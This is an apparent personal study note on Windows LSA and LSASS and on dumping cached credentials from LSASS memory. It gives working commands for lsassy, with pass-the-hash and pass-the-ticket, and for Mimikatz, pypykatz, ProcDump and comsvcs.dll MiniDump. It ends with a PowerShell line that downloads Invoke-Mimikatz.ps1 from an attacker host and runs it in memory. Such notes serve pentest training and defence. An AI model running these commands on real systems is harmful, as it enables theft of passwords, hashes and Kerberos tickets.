---
created: 03-03-2026
tags:
  - Windows
  - password_attacks
  - Windows_credential_dumping
---

## About Windows LSA and LSASS

>Windows **Local Security Authority (LSA)** is protected subsystem responsible for authenticating and logging users on to the local system.

> Windows **Local Security Authority (LSA)** is a protected subsystem responsible for processing authentication requests, enforcing security policy, and managing authenticated sessions on a local Windows host.

- The LSA implements core security functions in Windows; it generates access tokens, handles SSO (Single-Sign On), loads *authentication packages* like NTLM and Kerberos, and more (see [`LSA Authentication Model — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29#lsass-process-memory)).
- The LSA itself is not a standalone process but an architectural component implemented by various DLLs.

>The **Local Security Authority Subsystem Service (LSASS)** is the *actual process* that hosts LSA and loaded authentication packages.

- LSASS runs as `lsass.exe` under the `SYSTEM` account; it handles interactive and network logons, enforces local and domain security policies, generates access tokens for authenticated session, writes security audit events to the Windows Security Log, *caches credentials*, including NTLM hashes and Kerberos tickets, to support SSO, and more.
- And because if these functions, LSASS necessarily loads and stores authentication material in process memory. This makes it a common target for credential theft attacks (see [`Cached and Stored Credentials Technical Overview — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29)).

- Credentials LSASS holds include:
	- NT and LM hashes of users' passwords
	- Kerberos tickets (TGTs, service tickets)

## Dumping credentials from LSASS memory

To access another process’s memory on Windows, you normally need the **`SeDebugPrivilege`** — in practice, held only by privileges accounts like local Administrator or `SYSTEM`. Without appropriate privileges, attempts to read LSASS memory fail.

In practice, extracting credentials from LSASS memory follows of these two scenarios:
- **Direct memory access**
	- To extract credentials from LSASS memory, a tool like Mimikatz, having acquired `SeDebugPrivilege`, will open a handle to the LSASS process using Win32 API such as `OpenProcess()`, and then scan memory for known structures loaded by security packages (e.g., `MSV1_0`, `Kerberos`, `WDigest`). 
	- When found, the tool interprets the in-memory format of those structures to recover credentials — hashes, tickets, and plaintext passwords.
- **Memory dump + offline scanning**
	- Instead of scanning LSASS memory live, you can dump the entire LSASS memory space to a file and then parse it offline. This approach is useful when in-memory access is blocked by defenses. 
	- To create a full memory dump, you can invoke the `MiniDump` function from `comsvcs.dll` (`C:\Windows\system32\comsvcs.dll`) or use Sysinternals `ProcDump` — both are legitimate built-in Windows tools. Behind the scenes, these invoke the Windows API function [`MiniDumpWriteDump()`](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) or similar, which serializes the target process memory into a file.
	- To analyze the dump afterwards, you would use Mimikatz or `pypykatz`. They use the same in-memory data structure signatures to extract credential material as live-scanning tools. 

>[!tip]+
>One more way to create a process's memory dump in Windows is using Task Manager -> `Create Dump File`.

Tools commonly used to dump credentials from LSASS memory include:
- [`lsassy`](https://github.com/login-securite/lsassy)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [`pypykatz`](https://github.com/skelsec/pypykatz)
- [`ProcDump`](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/))
- `comsvcs.dll`
- [`PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)'s [`Invoke-Mimikatz.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

### `lsassy`

>[`lsassy`](https://github.com/login-securite/lsassy) is a Python tool that can be used to remotely extract credentials from a set of Windows hosts.

>[!note]+ Installation
>```bash
>python3 -m pip install lsassy
>```

- With [[Pass-the-Hash]] (NTLM):

```bash
lsassy -u <user> -H <NT_hash> <targets>
```

- With plaintext password:

```bash
lsassy -d <domain> -u <user> -p <password> <targets>
```

- With [[Pass-the-Ticket]] (Kerberos):

```bash
lsassy -k <targets>
```

>[!note] The above command requires a valid TGT in the `KRB5CCNAME` environment variable.
#### Mimikatz

[[Mimikatz]] an be used locally to extract credentials from the LSASS process's memory using the `sekurlsa::logonpasswords` module:

```powershell
sekurlsa::logonpasswords
```

>[!note] Internally, `sekurlsa::logonpasswords` finds credential lists in LSASS memory, decodes them, and renders them in PowerShell.

Or, if you already have an LSASS memory dump (obtained using [`ProcDump`](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump), for example), you can use the `sekurlsa::minidump` module to analyze it offline:

```powershell
sekurlsa::minidump lsass.dmp
```
```powershell
sekurlsa::logonpasswords
```

>[!example]+
>![[mimikatz2.png]]

#### `pypykatz`

[`pypykatz`](https://github.com/skelsec/pypykatz) is another way to analyze acquired LSASS memory dump offline:

```bash
pypykatz lsa minidump lsass.dmp
```

>[!note]+ Installation
> ```bash
> pip3 install pypykatz
> ```

### `ProcDump`

[`ProcDump`](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/)) can be used to dump LSASS process's memory:

```powershell
procdump -accepteula -ma <LSASS_PID> lsass.dmp
```

>[!note] You can download `ProcDump.exe` from [`live.sysinternals.com`](https://live.sysinternals.com/).

>[!tip]+
>- Find LSASS PID:
>```powershell
>tasklist /fi "imagename eq lsass.exe"
>```

### `comsvcs.dll`

`comsvcs.dll` is a legitimate Windows system file located at `C:\Windows\system32\comsvcs.dll`; it's part of the Microsoft Component Services and provides COM+ functionality. The DLL contains a function called **`MiniDump`** (exported as ordinal 24), which can be used to create a [minidump of a process's memory](https://docs.datadoghq.com/security/default_rules/def-000-zzz/).

DLLs can be run directly using the [`rundll32`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) domain:


```powershell
rundll32 C:\Windows\system32\comsvcs.dll MiniDump <LSASS_PID> lsass.dmp full
```

>[!tip]+
>- Find LSASS PID:
>```powershell
>tasklist /fi "imagename eq lsass.exe"
>```

>[!note] The use of `comsvcs.dll` for memory dumping is a **MITRE ATT&CK T1003.001** technique ([OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)).
### `PowerSploit`'s `Invoke-Mimikatz.ps1`

[`PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)'s [`Invoke-Mimikatz.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) loads Mimikatz 2.0 in memory using PowerShell. This can be used to dump credentials without writing anything to disk.

```bash
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://<attacker_ip_address>/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

## References and further reading

- [`LSA Authentication Model — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication-model)
- [`Cached and Stored Credentials Technical Overview — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29)
- [`LSASS secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass)
- [`OS Credential Dupming: LSASS Memory — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/001/)
- [`LSASS Memory — garnet`](https://mitre.garnet.ai/mitre/mitre/ta0006/t1003/t1003.001)